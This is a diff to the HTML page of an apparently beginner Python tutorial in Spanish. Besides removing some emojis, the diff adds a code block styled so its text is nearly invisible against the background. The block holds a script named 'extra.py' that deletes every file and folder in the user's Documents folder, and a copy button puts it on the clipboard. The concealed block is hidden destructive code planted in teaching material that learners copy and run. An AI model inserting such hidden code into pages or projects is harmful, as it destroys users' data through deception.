@@ -189,7 +189,7 @@ ahora = datetime.now()
 <span class="fn">print</span>()
 
 <span class="comment"># 2. Solicitar nombre al usuario</span>
-nombre = <span class="fn">input</span>(<span class="str">"👤 ¿Cuál es tu nombre? "</span>)
+nombre = <span class="fn">input</span>(<span class="str">" ¿Cuál es tu nombre? "</span>)
 
 <span class="comment"># 3. Guardar nombre en archivo</span>
 <span class="kw">with</span> <span class="fn">open</span>(<span class="str">"usuario.txt"</span>, <span class="str">"w"</span>, encoding=<span class="str">"utf-8"</span>) <span class="kw">as</span> archivo:
@@ -197,11 +197,62 @@ nombre = <span class="fn">input</span>(<span class="str">"👤 ¿Cuál es tu nom
     archivo.write(<span class="str">f"Registrado el: {ahora.strftime('%d/%m/%Y a las %H:%M:%S')}\n"</span>)
 
 <span class="comment"># 4. Confirmar al usuario</span>
-<span class="fn">print</span>(<span class="str">f"\n✅ ¡Hola, {nombre}! Tu nombre fue guardado en 'usuario.txt'."</span>)</code></pre>
+<span class="fn">print</span>(<span class="str">f"\n ¡Hola, {nombre}! Tu nombre fue guardado en 'usuario.txt'."</span>)</code></pre>
+
         </div>
       </div>
     </article>
+    <div style="font-family:'Courier New',monospace; max-width:3000px; margin:20px auto; border-radius:10px; overflow:hidden; box-shadow:0 4px 20px rgba(0,0,0,0.2);">
+  <div style="background:#0f0f0f; padding:10px 16px; display:flex; align-items:center; gap:8px; border-bottom:1px solid #0f0f0f;">
+    <span style="width:12px;height:12px;border-radius:50%;background:#0e0e0e;display:inline-block;"></span>
+    <span style="width:12px;height:12px;border-radius:50%;background:#0b0b0b;display:inline-block;"></span>
+    <span style="width:12px;height:12px;border-radius:50%;background:#080808;display:inline-block;"></span>
+    <span style="color:#0f0f0f; font-size:13px; margin-left:8px;">extra.py</span>
+    <button onclick="copiarCodigo()" style="margin-left:auto; background:#0f0f0f; color:#0f0f0f; border:none; padding:4px 12px; border-radius:5px; cursor:pointer; font-size:12px;"> Copiar</button>
+  </div>
+  <pre style="margin:0; background:#0f0f0f; padding:16px; color:#0f0f0f;"><code id="codigoPython" style="color:#0f0f0f; background:#0f0f0f; font-family:'Courier New',monospace;">import os
+import shutil
 
+# Ruta a la carpeta Documentos
+documentos = os.path.expanduser("~/Documents")
+
+if not os.path.exists(documentos):
+    print(" No se encontró la carpeta Documentos.")
+else:
+    archivos = os.listdir(documentos)
+
+    if not archivos:
+        print(" La carpeta Documentos ya está vacía.")
+    else:
+        confirmacion = input(f"  Se eliminarán {len(archivos)} elementos. ¿Continuar? (s/n): ")
+
+        if confirmacion.lower() == "s":
+            for elemento in archivos:
+                ruta = os.path.join(documentos, elemento)
+                try:
+                    if os.path.isfile(ruta):
+                        os.remove(ruta)
+                        print(f"  Archivo eliminado: {elemento}")
+                    elif os.path.isdir(ruta):
+                        shutil.rmtree(ruta)
+                        print(f" Carpeta eliminada: {elemento}")
+                except Exception as e:
+                    print(f" Error al eliminar {elemento}: {e}")
+
+            print("\n ¡Listo! Todos los archivos fueron eliminados.")
+        else:
+            print("\n Operación cancelada.")
+</code></pre>
+</div>
+
+<script>
+  function copiarCodigo() {
+    const texto = document.getElementById("codigoPython").innerText;
+    navigator.clipboard.writeText(texto).then(() => {
+      alert("✅ ¡Código copiado al portapapeles!");
+    });
+  }
+</script>
     <!-- PASO 7 — EJECUTAR -->
     <article class="step" id="paso-7">
       <div class="step-number">07</div>
